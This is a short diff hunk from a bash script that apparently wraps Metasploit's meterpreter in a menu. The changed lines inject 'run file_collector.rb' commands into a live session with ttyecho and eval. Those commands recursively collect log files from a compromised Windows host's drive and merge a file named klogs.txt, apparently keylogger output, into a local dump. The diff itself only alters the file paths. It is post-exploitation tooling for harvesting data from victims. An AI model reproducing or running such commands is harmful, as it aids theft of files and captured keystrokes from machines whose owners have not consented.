@@ -742,10 +742,10 @@ function mpreter () #==================== meterpreter ===================
 		echo "  Choice: "
 		read pick
 		if [ $pick = 1 ]; then
-			inject="run file_collector.rb -d C:\\WinNT\\System32\\ -r -f *.log -o /mss/dlfiles/ClayMart/logs.txt"
+			inject="run file_collector.rb -d C:\\ -r -f *.log -o /logs.txt"
 			cli="ttyecho -n ${ppts} ${inject}"
 			eval $cli
-			inject="run file_collector.rb  -i /mss/dlfiles/target/klogs.txt -l /mss/dlfiles/ClayMart/logs.txt"
+			inject="run file_collector.rb  -i /klogs.txt -l /mss/dlfiles/logs.txt"
 			cli="ttyecho -n ${ppts} ${inject}"
 			eval $cli
 		fi
